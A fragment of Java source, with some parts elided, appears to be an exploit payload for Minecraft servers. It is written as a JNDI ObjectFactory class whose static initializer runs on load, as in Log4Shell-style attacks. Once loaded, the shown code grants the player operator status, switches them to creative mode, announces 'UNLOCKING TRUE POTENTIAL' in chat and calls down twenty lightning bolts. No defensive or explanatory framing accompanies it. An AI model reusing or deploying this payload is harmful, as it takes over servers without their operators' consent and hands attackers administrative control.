...
public class UnlockTruePotential implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            ...
            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nUNLOCKING TRUE POTENTIAL...\u00a75\u00a7k-|-"), ChatType.SYSTEM));
                server.getPlayerList().addOp(me.getGameProfile());
                me.setGameType(GameType.CREATIVE);
                for (int i = 0; i < 20; i++) {
                    me.getServerWorld().addWeatherEffect(new EntityLightningBolt(me.getServerWorld(), me.posX, me.posY, me.posZ, false));
                }
            }
